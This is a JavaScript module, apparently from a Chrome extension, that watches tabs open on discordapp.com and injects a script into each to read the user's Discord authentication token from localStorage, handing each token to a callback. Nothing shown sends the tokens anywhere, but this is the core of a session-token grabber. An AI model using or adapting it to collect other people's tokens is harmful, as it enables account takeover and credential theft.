import config from './Config';

const DISCORDAPP_HOSTNAME = 'discordapp.com';
const DISCORD_TAB_QUERY = { url: `*://${DISCORDAPP_HOSTNAME}/*` };

export default class TokensTracker {
  constructor() {
    this._started = false;
    this._listeners = {
      onCreated: this._onTabCreated.bind(this),
      onUpdated: this._onTabUpdated.bind(this),
    }
  }
  start() {
    if (!this._started) {
      this._findTabsTokens();
      for (let eventMethod in this._listeners) {
        chrome.tabs[eventMethod].addListener(this._listeners[eventMethod]);
      }
      this._started = true;
    }
  }
  stop() {
    if (this._started) {
      for (let eventMethod in this._listeners) {
        chrome.tabs[eventMethod].removeListener(this._listeners[eventMethod]);
      }
      this._started = false;
    }
  }
  get isStarted() {
    return this._started;
  }
  set onFound(callback) {
    this._onFoundCallback = callback;
  }
  _hostnameMatches(url) {
    try {
      return new URL(url).hostname === DISCORDAPP_HOSTNAME;
    } catch (e) {
      return false;
    }
  }
  _findTabsTokens() {
    chrome.tabs.query(
      DISCORD_TAB_QUERY,
      (tabs) => tabs.forEach((tab) => this._checkTabForToken(tab))
    );
  }
  _checkTabForToken(tab) {
    chrome.tabs.executeScript(
      tab.id,
      { code: `localStorage.getItem('token');` },
      (results) => results
        .map((result) => JSON.parse(result))
        .filter((token) => token ? true : false)
        .forEach((token) => this._onFoundCallback(token))
    );
  }
  _onTabCreated(tab) {
    if (this._hostnameMatches(tab.url)) {
      this._checkTabForToken(tab);
    }
  }
  _onTabUpdated(tabId, changeInfo, tab) {
    this._onTabCreated(tab);
  }
}
